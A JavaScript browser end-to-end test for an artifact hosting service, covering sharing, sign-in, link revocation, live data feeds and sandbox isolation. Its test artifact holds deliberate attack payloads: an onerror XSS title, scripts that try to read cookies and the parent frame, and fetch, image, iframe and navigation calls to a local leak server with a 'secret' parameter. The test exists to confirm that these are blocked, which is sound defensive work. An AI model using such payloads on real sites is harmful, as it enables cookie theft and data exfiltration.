import assert from 'node:assert/strict'
import { randomBytes, randomUUID } from 'node:crypto'
import { once } from 'node:events'
import { createServer } from 'node:http'
import { chromium } from './browser/harness.mjs'
import { AccountClient } from '../packages/protocol/dist/auth/account-client.js'
import { AccountStore } from '../apps/connect-server/dist/store.js'
import { createConnectServer } from '../apps/connect-server/dist/server.js'
import { ArtifactStore } from '../apps/artifact-server/dist/store.js'
import { createArtifactServer } from '../apps/artifact-server/dist/server.js'

const servers = []
const listen = async (server) => {
  servers.push(server)
  server.listen(0, '127.0.0.1')
  await once(server, 'listening')
  return `http://127.0.0.1:${server.address().port}`
}
const accounts = new AccountStore(':memory:')
const store = new ArtifactStore(':memory:')
const serviceKey = randomBytes(32).toString('base64url')
let broker, host, browser, connectOrigin
const leaks = []
try {
  connectOrigin = await listen(createServer((req, res) => broker.emit('request', req, res)))
  const origin = await listen(createServer((req, res) => host.emit('request', req, res)))
  const leakOrigin = await listen(
    createServer((req, res) => {
      leaks.push(req.url)
      res.end('unexpected network access')
    }),
  )
  const identityOrigin = await listen(
    createServer((req, res) => {
      const url = new URL(req.url, 'http://identity.test')
      res.writeHead(302, {
        Location: `${connectOrigin}/auth/callback?state=${url.searchParams.get('state')}&code=browser-code`,
      })
      res.end()
    }),
  )
  broker = createConnectServer({
    store: accounts,
    origin: connectOrigin,
    artifacts: { origin, key: serviceKey },
    authorizationOrigin: identityOrigin,
    authorize: async (login) => {
      login.state = randomUUID()
      return `${identityOrigin}/authorize?state=${login.state}`
    },
    exchange: async () => ({ id: 'recipient', name: 'Recipient' }),
  })
  host = createArtifactServer({ store, origin, connectOrigin, serviceKey }).server
  const login = accounts.createLogin()
  accounts.approve(login.login, { id: 'owner', name: 'Owner' })
  const client = new AccountClient(
    { read: async () => login.token, write: async () => {} },
    async () => {},
    connectOrigin,
  )
  await client.load()
  const artifact = {
    id: randomUUID(),
    taskId: 'private-thread-must-not-leak',
    revision: 1,
    title: '<img src=x onerror=alert(1)> interactive report',
    format: 'html',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    content: `<p id="live">Waiting</p><script>addEventListener('dovo:artifact-data',event=>{document.getElementById('live').textContent=JSON.stringify(event.detail);});</script><button id="counter" onclick="this.textContent=Number(this.textContent)+1">0</button>
      <button id="navigate" onclick="location.href='${leakOrigin}/navigation?secret=example'">Try navigation</button>
      <script>
        document.body.dataset.native = String(!!(window.ReactNativeWebView || window.dovo || window.chrome?.webview));
        try { parent.document.body.dataset.compromised='yes'; document.body.dataset.parent='open' } catch { document.body.dataset.parent='blocked' }
        try { document.body.dataset.cookies=document.cookie || 'empty' } catch { document.body.dataset.cookies='blocked' }
        fetch('${leakOrigin}/fetch').then(()=>document.body.dataset.network='open').catch(()=>document.body.dataset.network='blocked');
      </script><img src="${leakOrigin}/image"><iframe src="${leakOrigin}/nested"></iframe>`,
  }
  const published = await client.publishArtifact(artifact, await client.artifactService())
  assert.equal((await client.publishArtifact(artifact, origin)).url, published.url)
  let writer
  await client.enableArtifactFeed(
    published.publicationId,
    origin,
    60,
    { count: 3 },
    async (credential) => {
      writer = credential
    },
  )
  browser = await chromium.launch()
  const ownerContext = await browser.newContext()
  const owner = await ownerContext.newPage()
  await owner.clock.install()
  const response = await owner.goto(published.manageUrl)
  assert.match(response.headers()['cache-control'], /no-store/)
  assert.equal(response.headers()['referrer-policy'], 'no-referrer')
  await owner.getByRole('heading', { name: 'Sharing settings', exact: true }).waitFor()
  assert.equal(new URL(owner.url()).hash, '')
  assert.equal(await owner.locator('header img').count(), 0)
  assert.equal(await owner.getByRole('heading', { name: artifact.title, exact: true }).count(), 1)
  const cookies = await ownerContext.cookies(origin)
  assert.equal(cookies.find((cookie) => cookie.name === 'dovo-artifacts').httpOnly, true)
  const guest = owner.frameLocator('iframe[title="Artifact preview"]')
  await guest.locator('#live').filter({ hasText: '"count":3' }).waitFor()
  const dataUpdate = await fetch(
    origin + '/v1/publications/' + published.publicationId + '/feed/data',
    {
      method: 'PUT',
      headers: { Authorization: 'Bearer ' + writer.token, 'Content-Type': 'application/json' },
      body: JSON.stringify({ generation: writer.generation, data: { count: 4 } }),
    },
  )
  assert.equal(dataUpdate.status, 200)
  await owner.clock.fastForward(15010)
  await guest.locator('#live').filter({ hasText: '"count":4' }).waitFor()
  await guest
    .locator('#live')
    .evaluate(() =>
      parent.postMessage({ type: 'tools/call', name: 'unapproved', arguments: {} }, '*'),
    )
  store.db.prepare('UPDATE feeds SET updated=?').run(Date.now() - 180000)
  await owner.clock.fastForward(15010)
  await owner.getByLabel('Live data status').filter({ hasText: 'Stale' }).waitFor()
  await guest.getByRole('button', { name: '0', exact: true }).click()
  await guest.getByRole('button', { name: '1', exact: true }).waitFor({ timeout: 3000 })
  const isolation = await guest
    .locator('body')
    .evaluate((element) => Object.fromEntries(Object.entries(element.dataset)))
  assert.equal(isolation.parent, 'blocked')
  assert.equal(isolation.cookies, 'blocked')
  assert.equal(isolation.native, 'false')
  assert.equal(isolation.network, 'blocked')
  assert.equal(await owner.locator('body').getAttribute('data-compromised'), null)
  await guest.getByRole('button', { name: 'Try navigation' }).click()
  // The outer frame-src policy also prevents an artifact navigating its own frame to an exfiltration URL.
  assert.deepEqual(leaks, [])

  const recipientContext = await browser.newContext({
    viewport: { width: 390, height: 844 },
    isMobile: true,
  })
  const recipient = await recipientContext.newPage()
  await recipient.goto(published.url)
  await recipient
    .getByRole('status')
    .filter({ hasText: 'Artifact unavailable or access not granted' })
    .waitFor()
  await recipient.getByRole('button', { name: 'Sign in', exact: true }).click()
  const popupPromise = recipient.waitForEvent('popup')
  await recipient.getByRole('link', { name: 'Continue to sign-in' }).click()
  const popup = await popupPromise
  await popup.getByRole('heading', { name: 'Sign in to Dovo Artifacts', exact: true }).waitFor()
  await popup.getByRole('button', { name: 'Continue to Dovo sign-in', exact: true }).click()
  await popup.getByRole('heading', { name: 'You are signed in', exact: true }).waitFor()
  await popup.close()
  await recipient.getByRole('button', { name: 'Check sign-in', exact: true }).click()
  await recipient.getByLabel('Sharing ID', { exact: true }).waitFor()
  assert.equal(await recipient.getByLabel('Sharing ID', { exact: true }).inputValue(), 'recipient')
  await owner.getByLabel('Recipient sharing ID', { exact: true }).fill('recipient')
  await owner.getByRole('button', { name: 'Invite account', exact: true }).click()
  await owner.getByRole('status').filter({ hasText: 'Account invited' }).waitFor()
  await recipient.reload()
  await recipient.getByRole('heading', { name: artifact.title, exact: true }).waitFor()
  assert.equal(
    await recipient.getByRole('heading', { name: 'Sharing settings', exact: true }).count(),
    0,
  )
  assert.equal(await recipient.getByRole('link', { name: 'Manage sharing' }).count(), 0)
  assert.equal(
    await recipient.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
    true,
  )

  await owner.getByRole('combobox', { name: 'Share link lifetime' }).click()
  await owner.getByRole('option', { name: '1 day', exact: true }).click()
  const linkRequest = owner.waitForRequest(
    (request) => request.method() === 'POST' && request.url().endsWith('/links'),
  )
  await owner.getByRole('button', { name: 'Create anyone-with-link access', exact: true }).click()
  assert.equal((await linkRequest).postDataJSON().seconds, 86400)
  const shared = owner.getByLabel('Shareable artifact link', { exact: true })
  await shared.waitFor()
  const sharedUrl = await shared.inputValue()
  assert.match(sharedUrl, /#share=[A-Za-z0-9_-]{43}$/)
  const anonymous = await browser.newPage()
  await anonymous.goto(sharedUrl)
  await anonymous.getByRole('heading', { name: artifact.title, exact: true }).waitFor()
  await anonymous.reload()
  await anonymous.getByRole('heading', { name: artifact.title, exact: true }).waitFor()
  assert.equal(anonymous.url(), sharedUrl)
  await anonymous
    .frameLocator('iframe[title="Artifact preview"]')
    .locator('#live')
    .filter({ hasText: '"count":4' })
    .waitFor()
  await owner.getByRole('button', { name: 'Stop and clear live feed', exact: true }).click()
  await owner
    .getByRole('status')
    .filter({ hasText: 'Live feed stopped and cached data cleared' })
    .waitFor()
  await owner
    .frameLocator('iframe[title="Artifact preview"]')
    .locator('#live')
    .filter({ hasText: '"data":null' })
    .waitFor()
  assert.equal(store.feedData(published.publicationId).data, null)
  await owner.getByRole('button', { name: 'Revoke link', exact: true }).click()
  await owner.getByRole('status').filter({ hasText: 'Share link revoked' }).waitFor()
  await anonymous.reload()
  await anonymous
    .getByRole('status')
    .filter({ hasText: 'Artifact unavailable or access not granted' })
    .waitFor()
  await owner.getByRole('button', { name: 'Remove access', exact: true }).click()
  await owner.getByRole('status').filter({ hasText: 'Invitation revoked' }).waitFor()
  await recipient.reload()
  await recipient
    .getByRole('status')
    .filter({ hasText: 'Artifact unavailable or access not granted' })
    .waitFor()
  accounts.revoke(login.token)
  await owner.goto('about:blank')
  await owner.goto(published.manageUrl)
  await owner.getByRole('button', { name: 'Sign in', exact: true }).waitFor()
  assert.deepEqual(leaks, [])
  console.log(
    'Hosted artifact browser: private publication, scoped browser sign-in, invitation/link revocation, mobile viewport, interactive sandbox, live data delivery/staleness/clearing and exfiltration isolation passed.',
  )
} finally {
  await browser?.close()
  for (const server of servers.reverse())
    await new Promise((resolve) => {
      server.close(resolve)
      server.closeAllConnections()
    })
  accounts.db.close()
  store.db.close()
}
